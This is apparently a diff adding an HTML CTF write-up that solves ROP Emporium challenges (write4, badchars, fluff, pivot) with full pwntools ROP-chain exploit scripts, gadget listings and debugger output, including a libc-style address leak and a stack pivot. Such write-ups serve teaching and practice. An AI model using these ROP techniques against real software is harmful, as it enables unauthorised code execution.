+19  0x00000df8    0x8 0x00600df8    0x8 -rw- .fini_array
+20  0x00000e00  0x1f0 0x00600e00  0x1f0 -rw- .dynamic
+21  0x00000ff0   0x10 0x00600ff0   0x10 -rw- .got
+22  0x00001000   0x28 0x00601000   0x28 -rw- .got.plt
+23  0x00001028   0x10 0x00601028   0x10 -rw- .data
+24  0x00001038    0x0 0x00601038    0x8 -rw- .bss ---
+</code></pre>
+<p>so here are sections that we can write into, its size and address. i will choose to write into <code>.data</code> here since it
+doesn't interfere with anything in the binary (maybe???).</p>
+<p>let's find gadgets for this exploit. let's look into what's inside the <code>usefulFunction</code> and <code>usefulGadgets</code></p>
+<pre><code>┌──(kali㉿kali)-[~/ctf/rop/write4]
+└─$ objdump -M intel --disassemble=usefulFunction -S write4
+---
+0000000000400617 &lt;usefulFunction&gt;:
+  400617:       55                      push   rbp
+  400618:       48 89 e5                mov    rbp,rsp
+  40061b:       bf b4 06 40 00          mov    edi,0x4006b4
+  400620:       e8 eb fe ff ff          call   400510 &lt;print_file@plt&gt;
+  400625:       90                      nop
+  400626:       5d                      pop    rbp
+  400627:       c3                      ret
+---
+</code></pre>
+<pre><code>┌──(kali㉿kali)-[~/ctf/rop/write4]
+└─$ objdump -M intel --disassemble=usefulGadgets -S write4
+---
+0000000000400628 &lt;usefulGadgets&gt;:
+  400628:       4d 89 3e                mov    QWORD PTR [r14],r15
+  40062b:       c3                      ret
+  40062c:       0f 1f 40 00             nop    DWORD PTR [rax+0x0]
+---
+</code></pre>
+<p>we can see there's and instruction to write <code>r15</code> in the address of <code>r14</code> let's find gadgets to get this done.</p>
+<pre><code>┌──(kali㉿kali)-[~/ctf/rop/write4]
+└─$ ROPgadget --binary write4 | grep r14
+0x0000000000400628 : mov qword ptr [r14], r15 ; ret
+0x000000000040068c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x000000000040068e : pop r13 ; pop r14 ; pop r15 ; ret
+0x0000000000400690 : pop r14 ; pop r15 ; ret
+0x000000000040068b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x000000000040068f : pop rbp ; pop r14 ; pop r15 ; ret
+0x000000000040068d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
+</code></pre>
+<p><code>pop r14 ; pop r15 ; ret</code> and <code>mov qword ptr [r14], r15 ; ret</code> nice.</p>
+<p>let's chain them together now!</p>
+<pre><code class="language-python">from pwn import *
+
+padding = b"x"*40
+pop_r14_r15 = 0x400690
+mov_r14_r15 = 0x400628
+print_file = 0x400510
+pop_rdi = 0x400693
+data_sec = 0x601028
+
+file_to_print = b"flag.txt"
+
+p = process("./write4")
+
+payload = padding + p64(pop_r14_r15) + p64(data_sec) + file_to_print + p64(mov_r14_r15) + p64(pop_rdi) + p64(data_sec) + p64(print_file)
+
+p.sendline(payload)
+
+print(p.recvall().decode("utf-8"))
+</code></pre>
+<p>result:</p>
+<pre><code>┌──(kali㉿kali)-[~/ctf/rop/write4]
+└─$ python solve.py
+[+] Starting local process './write4': pid 2004
+[*] Switching to interactive mode
+write4 by ROP Emporium
+x86_64
+
+Go ahead and give me the input already!
+
+&gt; Thank you!
+ROPE{a_placeholder_32byte_flag!}
+</code></pre>
+<p>nicesu nicesu!!</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="5-badchars"><a class="header" href="#5-badchars">5. badchars</a></h1>
+<p>the fifth challenge, it is pretty similar to the previous challenge <a href="./4.write4.html"><code>write4</code></a> but this time, the input
+is processed and turned some byte into a bad character.</p>
+<p>the challenge showed us the bad characters which are <code>'x', 'g', 'a', '.'</code>.</p>
+<p>with this knowledege let's find the gadgets and see what we can do using <code>ROPgadget</code>.</p>
+<pre><code>0x0000000000400634 : mov qword ptr [r13], r12 ; ret
+0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004006a3 : pop rdi ; ret
+</code></pre>
+<p>these are some gadgets that i find useful for us to use create this ROP chain.</p>
+<p>now let's find where do we write to.</p>
+<pre><code>┌──(kali㉿kali)-[~/ctf/rop/badchars]
+└─$ rabin2 -S badchars
+[Sections]
+
+nth paddr        size vaddr       vsize perm name
+―――――――――――――――――――――――――――――――――――――――――――――――――
+18  0x00000df0    0x8 0x00600df0    0x8 -rw- .init_array
+19  0x00000df8    0x8 0x00600df8    0x8 -rw- .fini_array
+20  0x00000e00  0x1f0 0x00600e00  0x1f0 -rw- .dynamic
+21  0x00000ff0   0x10 0x00600ff0   0x10 -rw- .got
+22  0x00001000   0x28 0x00601000   0x28 -rw- .got.plt
+23  0x00001028   0x10 0x00601028   0x10 -rw- .data
+24  0x00001038    0x0 0x00601038    0x8 -rw- .bss
+</code></pre>
+<p><code>.data</code> seems okay so let's use that.</p>
+<p>let's make the script.</p>
+<pre><code class="language-python">from pwn import *
+
+padding = b"x"*40
+
+print_file = 0x400510
+
+pop_r1 = 0x40069c
+mov_r13_r12 = 0x400634
+pop_rdi = 0x4006a3
+
+data_sec = 0x601028
+
+file_to_print = b"flag.txt"
+
+p = process("./badchars")
+
+gdb.attach(p, "break print_file")
+
+payload = padding + p64(pop_r1) + file_to_print + p64(data_sec) + p64(0xaaaaaaaa) + p64(0xaaaaaaaa) + p64(mov_r13_r12)
+payload += p64(pop_rdi) + p64(data_sec) + p64(print_file)
+
+p.sendline(payload)
+
+p.interactive()
+</code></pre>
+<p>let's try it and see what will happen to our <code>flag.txt</code> string...</p>
+<pre><code>gef➤  x/s 0x601028
+0x601028:       "fl\353\353\353t\353t"
+gef➤  x/2xg 0x601028
+0x601028:       0x74eb74ebebeb6c66      0x0000000000000000
+</code></pre>
+<p>so this happened to our string, the character that are in the list of bad chars get replaced by <code>0xeb</code>.</p>
+<p>our ROP chain doesn't seem to be broken so lucky for us, now that we have this info what can we do?
+since some of the string are still intact we can just use some gadgets to replace the bad bytes, let's find them.
+oh wait i forgot to look into the <code>usefulGadgets</code> function so let's do that first.</p>
+<pre><code>┌──(kali㉿kali)-[~/ctf/rop/badchars]
+└─$ objdump -M intel --disassemble=usefulGadgets -S badchars
+
+badchars:     file format elf64-x86-64
+
+0000000000400628 &lt;usefulGadgets&gt;:
+  400628:       45 30 37                xor    BYTE PTR [r15],r14b
+  40062b:       c3                      ret
+  40062c:       45 00 37                add    BYTE PTR [r15],r14b
+  40062f:       c3                      ret
+  400630:       45 28 37                sub    BYTE PTR [r15],r14b
+  400633:       c3                      ret
+  400634:       4d 89 65 00             mov    QWORD PTR [r13+0x0],r12
+  400638:       c3                      ret
+  400639:       0f 1f 80 00 00 00 00    nop    DWORD PTR [rax+0x0]
+</code></pre>
+<p>i see, so we have xor, add and sub instructions for us to use byte by byte. i decided to use xor here.</p>
+<p>let's craft our new payload to fix the bad chars in memory.</p>
+<pre><code class="language-python">from pwn import *
+
+def findXor(x, badbyte = 0xeb):
+    for i in range(255):
+        if i ^ badbyte == x:
+            return i
+    return 0
+
+badbyte = 0xeb
+
+padding = b"x"*40
+
+print_file = 0x400510
+
+pop_r1 = 0x40069c
+mov_r13_r12 = 0x400634
+pop_rdi = 0x4006a3
+pop_r14_r15 = 0x4006a0
+xor_r15_r14 = 0x400628
+sub_r15_r14 = 0x400630
+
+data_sec = 0x601028
+
+file_to_print = b"flag.txt"
+
+p = process("./badchars")
+
+gdb.attach(p, "break print_file")
+
+fixBadbyte = lambda char, addr : p64(pop_r14_r15) + p64(findXor(ord(char))) + p64(addr) + p64(xor_r15_r14)
+
+payload = padding + p64(pop_r1) + file_to_print + p64(data_sec) + p64(findXor(ord("a")))
+payload += p64(data_sec + 2) + p64(mov_r13_r12) + p64(xor_r15_r14) + fixBadbyte("g", data_sec + 3)
+payload += fixBadbyte(".", data_sec + 4) + fixBadbyte("x", data_sec + 6) + p64(pop_rdi) + p64(data_sec) + p64(print_file)
+
+p.sendline(payload)
+
+p.interactive()
+</code></pre>
+<p>this should work...</p>
+<pre><code>┌──(kali㉿kali)-[~/ctf/rop/badchars]
+└─$ python solve.py
+[+] Starting local process './badchars': pid 965
+[*] running in new terminal: ['/usr/bin/gdb', '-q', './badchars', '965', '-x', '/tmp/pwnms4tsxy0.gdb']
+[+] Waiting for debugger: Done
+[*] Switching to interactive mode
+badchars by ROP Emporium
+x86_64
+
+badchars are: 'x', 'g', 'a', '.'
+&gt; Thank you!
+Failed to open file: flag.t\xebt
+$                           [*] Got EOF while reading in interactive
+</code></pre>
+<p>hold on why is that? why is the character <code>x</code> doesn't get fixed? maybe our rop chain is broken so let's see.</p>
+<p><code>fixBadbyte("x", data_sec + 6)</code> is where we fix the bad char for <code>x</code> since we know that addresses also get
+affected by the bad chars filter, so something goes wrong here, maybe the address??</p>
+<p>we know our <code>.data</code> section is <code>0x601028</code> since we <code>+6</code> the address is <code>0x601028 + 6 = 0x60102e</code> and it includes
+one of the bad bytes which is <code>0x2e</code>. so what can we do here...</p>
+<p>how about we shift the address of <code>.data</code> by one so that our ROP chain doesn't use <code>0x60102e</code> any more
+but instead we use <code>0x60102f</code>, sounds great! let's do just that.</p>
+<pre><code class="language-python">from pwn import *
+
+def findXor(x, badbyte = 0xeb):
+    for i in range(255):
+        if i ^ badbyte == x:
+            return i
+    return 0
+
+badbyte = 0xeb
+
+padding = b"x"*40
+
+print_file = 0x400510
+
+pop_r1 = 0x40069c
+mov_r13_r12 = 0x400634
+pop_rdi = 0x4006a3
+pop_r14_r15 = 0x4006a0
+xor_r15_r14 = 0x400628
+sub_r15_r14 = 0x400630
+
+data_sec = 0x601029
+
+file_to_print = b"flag.txt"
+
+p = process("./badchars")
+
+gdb.attach(p, "break print_file")
+
+fixBadbyte = lambda char, addr : p64(pop_r14_r15) + p64(findXor(ord(char))) + p64(addr) + p64(xor_r15_r14)
+
+payload = padding + p64(pop_r1) + file_to_print + p64(data_sec) + p64(findXor(ord("a")))
+payload += p64(data_sec + 2) + p64(mov_r13_r12) + p64(xor_r15_r14) + fixBadbyte("g", data_sec + 3)
+payload += fixBadbyte(".", data_sec + 4) + fixBadbyte("x", data_sec + 6) + p64(pop_rdi) + p64(data_sec) + p64(print_file)
+
+p.sendline(payload)
+
+p.interactive()
+</code></pre>
+<p>let's run it</p>
+<pre><code>┌──(kali㉿kali)-[~/ctf/rop/badchars]
+└─$ python solve.py
+[+] Starting local process './badchars': pid 1008
+[*] running in new terminal: ['/usr/bin/gdb', '-q', './badchars', '1008', '-x', '/tmp/pwn6i7nie6c.gdb']
+[+] Waiting for debugger: Done
+[*] Switching to interactive mode
+badchars by ROP Emporium
+x86_64
+
+badchars are: 'x', 'g', 'a', '.'
+&gt; Thank you!
+ROPE{a_placeholder_32byte_flag!}
+</code></pre>
+<p>nicesu!!!</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="6-fluff"><a class="header" href="#6-fluff">6. fluff</a></h1>
+<p>the sixth challenge, the most difficult challenge by far and it took me roughly
+2 days to complete.</p>
+<p>this challenge is similar to <a href="4.write4.html"><code>write4</code></a> but now, we need to use
+more uncommon instructions to write the string into memory, the function
+<code>print_file</code> is still present in the binary.</p>
+<p>the binary doesn't contain the usual instructions such as <code>mov [reg], reg</code> for
+us to use to write into memory, so let's inspect into the binary and see what
+we can do.</p>
+<pre><code>gef➤  i func
+All defined functions:
+
+Non-debugging symbols:
+0x00000000004004d0  _init
+0x0000000000400500  pwnme@plt
+0x0000000000400510  print_file@plt
+0x0000000000400520  _start
+0x0000000000400550  _dl_relocate_static_pie
+0x0000000000400560  deregister_tm_clones
+0x0000000000400590  register_tm_clones
+0x00000000004005d0  __do_global_dtors_aux
+0x0000000000400600  frame_dummy
+0x0000000000400607  main
+0x0000000000400617  usefulFunction
+0x0000000000400628  questionableGadgets
+0x0000000000400640  __libc_csu_init
+0x00000000004006b0  __libc_csu_fini
+0x00000000004006b4  _fini
+</code></pre>
+<p>what is <code>questionableGadgets</code>??</p>
+<pre><code>gef➤  disas questionableGadgets
+Dump of assembler code for function questionableGadgets:
+   0x0000000000400628 &lt;+0&gt;:     xlat   BYTE PTR ds:[rbx]
+   0x0000000000400629 &lt;+1&gt;:     ret
+   0x000000000040062a &lt;+2&gt;:     pop    rdx
+   0x000000000040062b &lt;+3&gt;:     pop    rcx
+   0x000000000040062c &lt;+4&gt;:     add    rcx,0x3ef2
+   0x0000000000400633 &lt;+11&gt;:    bextr  rbx,rcx,rdx
+   0x0000000000400638 &lt;+16&gt;:    ret
+   0x0000000000400639 &lt;+17&gt;:    stos   BYTE PTR es:[rdi],al
+   0x000000000040063a &lt;+18&gt;:    ret
+   0x000000000040063b &lt;+19&gt;:    nop    DWORD PTR [rax+rax*1+0x0]
+End of assembler dump.
+</code></pre>
+<p>what is <code>xlat</code>??? and what is <code>bextr</code> and <code>stos</code>?? that's the question i got
+from reading what's inside the function, let's read the documentation for them.</p>
+<h3 id="what-is-xlat"><a class="header" href="#what-is-xlat">what is xlat?</a></h3>
+<p>xlat or Table Look-up Translation is an instruction that uses <code>[rbx]</code> for an
+address to memory and <code>al</code> for an index and then set the value into <code>al</code> register
+essentially it's like an array we will find in a typical programming language.</p>
+<p>for example, we have <code>rbx</code> point to <code>0x400000</code> and <code>al</code> as a value of <code>0x4</code>,
+if we have a string in memory at <code>0x400000</code> that is <code>"Hello, Ropper"</code> we will
+get <code>"o"</code> or <code>0x6f</code> set to <code>al</code> register after the instruction is completed.</p>
+<h3 id="what-is-bextr"><a class="header" href="#what-is-bextr">what is bextr?</a></h3>
+<p>bextr or Bit Field Extract is an instruction that extracts a bits from a source
+register (second operand) and put it into a destination register where length and offset is set on
+the third operand where bit 7:0 is the offset and bit 15:8 is the length.</p>
+<p>an example from <a href="https://stackoverflow.com/questions/70208751/how-does-the-bextr-instruction-in-x86-work">stackoverflow</a></p>
+<blockquote>
+<p>Say the starting bit is 5 and the length is 9. we have</p>
+</blockquote>
+<pre><code>Input : 11010010001110101010110011011010 = 0xd23aacda
+                          |-------|
+                              \
+                               \
+                                \
+                                 v
+                               |-------|
+Output: 00000000000000000000000101100110 = 0x00000166
+</code></pre>
+<h3 id="what-is-stos"><a class="header" href="#what-is-stos">what is stos?</a></h3>
+<p>stos or Store String is an instruction that stores <code>al</code> register into the address
+of <code>[rdi]</code>. this instruction is pretty straightforward and self-explainatory.</p>
+<p>so, we have an instruction to get a string to a memory from <code>[rbx]</code> to <code>al</code>,
+we have an instruction to get value of <code>rcx</code> into <code>rbx</code> and an instruction to
+store <code>al</code> into <code>[rdi]</code>.</p>
+<p>we can see where this is going. we can write <code>al</code> into specific memory address
+with <code>[rdi]</code>, we can set <code>al</code> to something with <code>[rbx + al]</code> and lastly, we can
+control <code>rbx</code> with <code>bextr</code>, all good right? well not quite...</p>
+<h3 id="how-do-we-know-where-to-point-rbx-to-get-a-string-we-want"><a class="header" href="#how-do-we-know-where-to-point-rbx-to-get-a-string-we-want">how do we know where to point <code>rbx</code> to get a string we want???</a></h3>
+<p>i stuck here for a while and i came up with an idea, how about we select the string
+from the printed strings that.</p>
+<pre><code>┌──(kali㉿kali)-[~/ctf/rop/fluff]
+└─$ ./fluff
+fluff by ROP Emporium
+x86_64
+
+You know changing these strings means I have to rewrite my solutions...
+&gt;
+</code></pre>
+<p>as you can see here we have all the characters we wanted for the string <code>flag.txt</code>
+can we just point <code>rbx</code> to that right? well, as simple as it might sound it's actually
+impossible for me to do since the binary has patially RELRO, and those strings
+live inside an imported library, ahhhhhhhhhh...</p>
+<p>but wait, we can just leak the  library address right since we can do pretty
+much all we want, well, the binary doesn't import any other things except the
+library that is provided by the challenge.</p>
+<p>so we can't leak the address of the library to point it to the printed strings
+in the beginning.</p>
+<p>i stuck here for the rest of the day.</p>
+<p>day 2, my co-worker (shout out to him), told me that since we can point to
+anywhere we want just point it to the address in the binary itself, since random
+addresses can contain a byte that represent a character that we wanted, and
+<strong>THAT IS BRILLIANT</strong>.</p>
+<p>so i tried searching with <code>ropper</code> and there it is!</p>
+<pre><code>┌──(kali㉿kali)-[~/ctf/rop/fluff]
+└─$ ropper --string "f|l|a|g|.|t|x" -f fluff | awk '{ print $2, $1 }' | sort
+ =======
+. 0x0040024e
+. 0x00400251
+. 0x004003c9
+. 0x004003fd
+. 0x00400400
+. 0x00400434
+. 0x00400436
+. 0x00400439
+----- -------
+a 0x004003d6
+a 0x0040040c
+a 0x00400411
+a 0x00400418
+a 0x0040041a
+a 0x00400424
+f 0x004003c4
+f 0x004003c7
+f 0x004003c8
+f 0x004003e2
+f 0x004003f4
+g 0x004003cf
+g 0x004007a0
+l 0x00400239
+l 0x0040023f
+l 0x00400242
+l 0x004003c1
+l 0x004003c5
+l 0x004003e4
+l 0x004003f9
+l 0x00400405
+t 0x004003d5
+t 0x004003d8
+t 0x004003e0
+t 0x004003f1
+t 0x0040040b
+t 0x0040040e
+t 0x00400419
+t 0x00400423
+t 0x00400426
+t 0x004006cb
+t 0x004006ce
+Value Address
+x 0x00400246
+x 0x00400248
+x 0x004006c8
+x 0x00400725
+x 0x00400751
+x 0x00400778
+x 0x004007bc
+ Strings
+</code></pre>
+<p>that's all we wanted for the string <code>flag.txt</code>, let's craft the payload!</p>
+<pre><code class="language-python">from pwn import *
+
+pop_rdi = 0x4006a3
+stos = 0x400639
+xlat = 0x400628
+
+# pop rdx, pop rcx, add rcx,0x3ef2, bextr rbx,rcx,rdx
+bextr = 0x40062a
+add_rcx = 0x3ef2
+
+print_file = 0x400510
+data_sec = 0x601028
+padding = b"x" * 40
+
+p = process("./fluff")
+gdb.attach(p, """
+           break *0x40062a
+           break *0x400628
+           break print_file
+           """)
+
+payload = padding + p64(bextr) + p64(0x4000) + p64(0x004003c4 - add_rcx)
+payload += p64(xlat) + p64(pop_rdi) + p64(data_sec) + p64(stos)
+
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<p>let's can try this and see if it works.</p>
+<pre><code>     0x400626 &lt;usefulFunction+15&gt; pop    rbp
+     0x400627 &lt;usefulFunction+16&gt; ret
+●    0x400628 &lt;questionableGadgets+0&gt; xlat   BYTE PTR ds:[rbx]
+ →   0x400629 &lt;questionableGadgets+1&gt; ret
+   ↳    0x4006a3 &lt;__libc_csu_init+99&gt; pop    rdi
+        0x4006a4 &lt;__libc_csu_init+100&gt; ret
+        0x4006a5                  nop
+        0x4006a6                  cs     nop WORD PTR [rax+rax*1+0x0]
+        0x4006b0 &lt;__libc_csu_fini+0&gt; repz   ret
+        0x4006b2                  add    BYTE PTR [rax], al
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "fluff", stopped 0x400629 in questionableGadgets (), reason: SINGLE STEP
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x400629 → questionableGadgets()
+[#1] 0x4006a3 → __libc_csu_init()
+[#2] 0x400639 → questionableGadgets()
+[#3] 0x4006a3 → __libc_csu_init()
+[#4] 0x400510 → pwnme@plt()
+[#5] 0x7fff5414a80a → in eax, dx
+[#6] 0x7fb4d4414000 →  &lt;_rtld_global+0&gt; rcl BYTE PTR [rdx+0x41], 0xd4
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤  i r rax
+rax            0x67                0x67
+</code></pre>
+<p>wait, why do we get <code>0x67</code> it should be <code>0x66</code> what's going on? let's try that
+again and see the register before <code>xlat</code> maybe <code>rax</code> is something before <code>xlat</code>
+and that might interfere with our payload.</p>
+<pre><code>●→   0x400628 &lt;questionableGadgets+0&gt; xlat   BYTE PTR ds:[rbx]
+     0x400629 &lt;questionableGadgets+1&gt; ret
+●    0x40062a &lt;questionableGadgets+2&gt; pop    rdx
+     0x40062b &lt;questionableGadgets+3&gt; pop    rcx
+     0x40062c &lt;questionableGadgets+4&gt; add    rcx, 0x3ef2
+     0x400633 &lt;questionableGadgets+11&gt; bextr  rbx, rcx, rdx
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "fluff", stopped 0x400628 in questionableGadgets (), reason: BREAKPOINT
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x400628 → questionableGadgets()
+[#1] 0x4006a3 → __libc_csu_init()
+[#2] 0x400639 → questionableGadgets()
+[#3] 0x4006a3 → __libc_csu_init()
+[#4] 0x400510 → pwnme@plt()
+[#5] 0x7fff5414a80a → in eax, dx
+[#6] 0x7fb4d4414000 →  &lt;_rtld_global+0&gt; rcl BYTE PTR [rdx+0x41], 0xd4
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤  i r rax
+rax            0xb                 0xb
+</code></pre>
+<p>i see, that's why we don't get <code>0x66</code> or <code>f</code>, the offset might point to something else,
+so let's calculate where we are going to point to before <code>xlat</code> is executed by
+subtracting <code>0xb</code> from the address.</p>
+<pre><code class="language-python">...
+payload = padding + p64(bextr) + p64(0x4000) + p64(0x004003c4 - add_rcx - 0xb)
+...
+</code></pre>
+<pre><code>     0x400626 &lt;usefulFunction+15&gt; pop    rbp
+     0x400627 &lt;usefulFunction+16&gt; ret
+●    0x400628 &lt;questionableGadgets+0&gt; xlat   BYTE PTR ds:[rbx]
+ →   0x400629 &lt;questionableGadgets+1&gt; ret
+   ↳    0x4006a3 &lt;__libc_csu_init+99&gt; pop    rdi
+        0x4006a4 &lt;__libc_csu_init+100&gt; ret
+        0x4006a5                  nop
+        0x4006a6                  cs     nop WORD PTR [rax+rax*1+0x0]
+        0x4006b0 &lt;__libc_csu_fini+0&gt; repz   ret
+        0x4006b2                  add    BYTE PTR [rax], al
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "fluff", stopped 0x400629 in questionableGadgets (), reason: SINGLE STEP
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x400629 → questionableGadgets()
+[#1] 0x4006a3 → __libc_csu_init()
+[#2] 0x400639 → questionableGadgets()
+[#3] 0x4006a3 → __libc_csu_init()
+[#4] 0x400510 → pwnme@plt()
+[#5] 0x7ffc6a50100a → rex add BYTE PTR [rax], al
+[#6] 0x7feda750d000 →  &lt;_rtld_global+0&gt; shl dl, 0x50
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤  i r rax
+rax            0x66                0x66
+</code></pre>
+<p>yeah! that's what we wanted now let's craft the full payload.
+remember that everytime we get a character out, our <code>al</code> is gonna change so we
+have to calculate for the last string we wrote into the memory.</p>
+<pre><code class="language-python">from pwn import *
+
+pop_rdi = 0x4006a3
+stos = 0x400639
+xlat = 0x400628
+
+# pop rdx, pop rcx, add rcx,0x3ef2, bextr rbx,rcx,rdx
+bextr = 0x40062a
+add_rcx = 0x3ef2
+
+print_file = 0x400510
+data_sec = 0x601028
+padding = b"x" * 40
+
+p = process("./fluff")
+gdb.attach(p, """
+           break *0x40062a
+           break *0x400628
+           break print_file
+           """)
+
+def writeToMem(addr, index, al = 0xb):
+    return p64(bextr) + p64(0x4000) + p64(addr - add_rcx - al) + p64(xlat) + p64(pop_rdi) + p64(data_sec + index) + p64(stos)
+
+flag_file = "flag.txt"
+flagList = [0x004003c4, 0x00400239, 0x004003d6, 0x004003cf, 0x0040024e, 0x004003d5, 0x00400246 ,0x004003d5]
+
+payload = padding + writeToMem(flagList[0], 0)
+
+for i, char in enumerate(flag_file):
+    # we already wrote the first character, and we only loop for the recently added character
+    if i == len(flag_file) - 1:
+        break
+
+    payload += writeToMem(flagList[i + 1], i + 1, ord(char))
+
+payload += p64(pop_rdi) + p64(data_sec) + p64(print_file)
+
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<pre><code>┌──(kali㉿kali)-[~/ctf/rop/fluff]
+└─$ python solve.py
+[+] Starting local process './fluff': pid 58410
+[*] running in new terminal: ['/usr/bin/gdb', '-q', './fluff', '58410', '-x', '/tmp/pwncifz4jv2.gdb']
+[+] Waiting for debugger: Done
+[*] Switching to interactive mode
+fluff by ROP Emporium
+x86_64
+
+You know changing these strings means I have to rewrite my solutions...
+&gt; Thank you!
+ROPE{a_placeholder_32byte_flag!}
+</code></pre>
+<p>finally, we got the flag, i learnt a really neat trick from this challenge,
+to be honest, this challenge was very difficult for me but it's pretty fun using
+uncommon instructions so yeah nicesu nicesu!!</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="7-pivot"><a class="header" href="#7-pivot">7. pivot</a></h1>
+<p>the seventh challenge, in this challenge, the objective is to call a function
+<code>ret2win</code> that lives within an imported library and the stack is only small
+enough for a small rop chain, but the challenge provides us a space address
+with an address pointing to it. so we can write our full ropchain there and
+then "pivot" into that address.</p>
+<p>there're several gadgets for us to work on within the binary</p>
+<pre><code>$ objdump -M intel --disassemble=usefulGadgets -S pivot
+
+pivot:     file format elf64-x86-64
+
+
+Disassembly of section .init:
+
+Disassembly of section .plt:
+
+Disassembly of section .text:
+
+00000000004009bb &lt;usefulGadgets&gt;:
+  4009bb:       58                      pop    rax
+  4009bc:       c3                      ret
+  4009bd:       48 94                   xchg   rsp,rax
+  4009bf:       c3                      ret
+  4009c0:       48 8b 00                mov    rax,QWORD PTR [rax]
+  4009c3:       c3                      ret
+  4009c4:       48 01 e8                add    rax,rbp
+  4009c7:       c3                      ret
+  4009c8:       0f 1f 84 00 00 00 00    nop    DWORD PTR [rax+rax*1+0x0]
+  4009cf:       00
+</code></pre>
+<p>we can use <code>pop rax; ret; xchg rsp, rax; ret</code> to change the stack point to our
+pivot address.</p>
+<p>let's look into what's inside the binary.</p>
+<pre><code>gef➤  i func
+All defined functions:
+
+Non-debugging symbols:
+0x00000000004006a0  _init
+0x00000000004006d0  free@plt
+0x00000000004006e0  puts@plt
+0x00000000004006f0  printf@plt
+0x0000000000400700  memset@plt
+0x0000000000400710  read@plt
+0x0000000000400720  foothold_function@plt
+0x0000000000400730  malloc@plt
+0x0000000000400740  setvbuf@plt
+0x0000000000400750  exit@plt
+0x0000000000400760  _start
+0x0000000000400790  _dl_relocate_static_pie
+0x00000000004007a0  deregister_tm_clones
+0x00000000004007d0  register_tm_clones
+0x0000000000400810  __do_global_dtors_aux
+0x0000000000400840  frame_dummy
+0x0000000000400847  main
+0x00000000004008f1  pwnme
+0x00000000004009a8  uselessFunction
+0x00000000004009bb  usefulGadgets
+0x00000000004009d0  __libc_csu_init
+0x0000000000400a40  __libc_csu_fini
+0x0000000000400a44  _fini
+</code></pre>
+<p>there's one function that is imported from <code>libpivot</code> into the binary which is
+<code>foothold_function</code> but there's no <code>ret2win</code> imported, does that mean we can't call <code>ret2win</code>?</p>
+<p>no, <code>ret2win</code> is still possible to be call if we leaked the address of <code>foothold_function</code>
+and calculate the address to <code>ret2win</code> it is possible to be called.</p>
+<p>okay, if you did not read the <a href="https://ropemporium.com/guide.html">beginner's guide</a>
+of ROP Emporium yet, consider reading it now otherwise it won't make that much
+sense going forword.</p>
+<p>alright, now what do we have to do to leak the address of <code>foothold_function</code>?
+from the description of the challenge, the function is imported but is not used
+so the <code>got.plt</code> of <code>foothold_function</code> is not updated yet, what we have to do
+here is to call it using our rop chain and then leak the updated address in <code>got.plt</code>.</p>
+<p>after that we can use <code>puts</code> to leak the address of the updated <code>got.plt</code> of
+<code>foothold_function</code> then, use it to calculate the address in the library itself
+so that we get the base address of the library, then we can simply take the offset
+of <code>ret2win</code> and add it to the base address to get the runtime address of <code>ret2win</code>.
+after that we can call <code>main</code> again and send new chain with the address of <code>ret2win</code>.</p>
+<p>let's craft the chain to do so.</p>
+<pre><code class="language-python">from pwn import *
+
+elf = context.binary = ELF("./pivot")
+libpivot = ELF("./libpivot.so")
+rop = ROP(elf)
+p = process()
+
+# gdb.attach(p, "break foothold_function")
+
+padding = b"x" * 40
+
+main_plt = elf.symbols["main"]
+foothold_plt = elf.plt["foothold_function"]
+foothold_got = elf.got["foothold_function"]
+puts_plt = elf.plt["puts"]
+
+p.recvuntil(b"libpivot\n")
+
+pivot = int(p.recvline().decode("utf-8").split()[-1].strip()[2::], 16)
+log.info(f"pivot location: {hex(pivot)}")
+
+payload = p64(foothold_plt) + p64(rop.find_gadget(["pop rdi", "ret"])[0]) + p64(foothold_got) + p64(puts_plt) + p64(main_plt)
+
+p.sendline(payload)
+
+p.clean()
+
+xchg_rsp_rax = 0x4009bd # somehow ROPgadget can't find "xchg rsp, rax", "ret" but can be searched using commandline (why)
+p.sendline(padding + p64(rop.find_gadget(["pop rax", "ret"])[0]) + p64(pivot) + p64(xchg_rsp_rax))
+
+p.recvline()
+p.recvline()
+
+leak_foothold_bytes = bytearray.fromhex(p.recvline().strip().hex())
+leak_foothold_bytes.reverse()
+
+leak_foothold = int.from_bytes(leak_foothold_bytes)
+
+log.info(f"leaked foothold {hex(leak_foothold)}")
+
+base_libpivot = leak_foothold - libpivot.symbols["foothold_function"]
+
+ret2win = base_libpivot + libpivot.symbols["ret2win"]
+
+log.info(f"ret2win location: {hex(ret2win)}, we are jumping now!")
+
+p.clean()
+
+p.sendline(padding + p64(ret2win))
+p.interactive()
+</code></pre>
+<p>let's try it.</p>
+<pre><code>$ python solve.py
+[*] '/home/kali/ctf/rop/pivot/pivot'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+    RUNPATH:  b'.'
+[*] '/home/kali/ctf/rop/pivot/libpivot.so'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[*] Loaded 15 cached gadgets for './pivot'
+[+] Starting local process '/home/kali/ctf/rop/pivot/pivot': pid 1837
+[*] pivot location: 0x7efc12619f10
+[*] leaked foothold 0x7efc1280096a
+[*] ret2win location: 0x7efc12800a81, we are jumping now!
+[*] Switching to interactive mode
